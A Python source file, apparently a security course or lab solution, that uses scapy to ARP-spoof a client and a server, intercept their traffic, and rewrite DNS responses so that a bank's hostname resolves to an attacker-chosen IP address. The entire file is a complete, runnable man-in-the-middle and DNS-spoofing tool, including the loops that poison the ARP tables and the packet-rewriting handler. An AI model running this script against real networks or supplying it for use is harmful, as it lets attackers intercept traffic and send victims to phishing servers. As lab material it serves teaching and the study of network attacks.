# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
from scapy.all import *

import argparse
import os
import re
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=1, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    return getmacbyip(IP)


def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
    while True:
        spoof(serverIP, attackerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
        spoof(clientIP, attackerMAC, serverIP, serverMAC) # TODO: Spoof server ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
    packet = Ether(src=srcMAC, dst=dstMAC, type=0x806)/ARP(op="is-at", psrc=srcIP, pdst=dstIP, hwsrc=srcMAC, hwdst=dstMAC)
    sendp(packet)

# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    packet = ARP(op="is-at", pdst=dstIP, hwdst=dstMAC, psrc=srcIP, hwsrc=srcMAC)
    send(packet)


# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward
def interceptor(packet):
    global clientMAC, clientIP, serverMAC, serverIP, attackerMAC

    try:
        # Check if we want to intercept
        if(packet.haslayer(Ether) and packet[Ether].src == attackerMAC):
            # We sent this packet, ignore
            return

        if(not packet.haslayer(IP) or not packet.haslayer(Ether)):
            return
        
        # Forward the DNS query
        if(packet[IP].dst == serverIP and packet[IP].src == clientIP):
            if(packet.haslayer(DNS)):
                print("# Got DNS query")
                
                packet[Ether].src = attackerMAC
                packet[Ether].dst = serverMAC
                sendp(packet)

        # Modify the DNS response
        if(packet[IP].dst == clientIP and packet[IP].src == serverIP):
            if(packet.haslayer(DNS) and packet.haslayer(DNSRR) and packet.haslayer(DNSQR)):
                for i,v in enumerate(packet[DNSQR]):
                    print("# Found DNS Response with qname=", v.qname.decode())
                    if v.qname.decode() == "www.bankofbailey.com.":
                        packet[DNSRR][i].rdata="10.4.63.200"

                packet[Ether].src = attackerMAC
                packet[Ether].dst = clientMAC

                # Recalculate metadata
                del packet[Ether].chksum
                del packet[IP].chksum
                del packet[IP].len
                del packet[UDP].chksum
                del packet[UDP].len             
                packet.show2(dump=True)

                return sendp(packet)

    except Exception as e:
        print("# Error:", e)

if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    serverIP = args.serverIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    serverMAC = mac(serverIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)
